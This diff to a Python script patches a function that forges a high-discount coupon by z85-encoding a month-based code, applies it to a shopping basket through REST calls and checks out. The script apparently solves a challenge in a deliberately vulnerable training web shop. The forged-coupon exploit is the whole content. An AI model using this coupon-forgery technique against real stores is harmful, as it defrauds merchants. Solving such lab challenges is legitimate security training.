@@ -255,6 +255,7 @@ def _z85(data: bytes) -> str:
 def _forged_coupon(c):
     """Forge a >=80% coupon offline (z85 of 'MMMYY-99' for the current campaign month), apply it
     and check out — the order's discount>=80 solves it."""
+    import urllib.parse
     from datetime import datetime
     mmm = datetime.now().strftime("%b").upper() + datetime.now().strftime("%y")
     coupon = _z85((mmm + "-99").encode())
@@ -267,7 +268,8 @@ def _forged_coupon(c):
     H = {"Authorization": "Bearer " + tok}
     try:
         c.post("/api/BasketItems", headers=H, json={"ProductId": 1, "BasketId": bid, "quantity": 1})
-        c.put("/rest/basket/%s/coupon/%s" % (bid, coupon), headers=H)
+        # the z85 coupon contains #{}/ etc. -> it MUST be url-encoded in the path or the '#' truncates it
+        c.put("/rest/basket/%s/coupon/%s" % (bid, urllib.parse.quote(coupon, safe="")), headers=H)
         aid = c.post("/api/Addresss", headers=H, json={"fullName": "T", "mobileNum": "1234567890",
                      "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
                      "country": "Z"}).json()["data"]["id"]
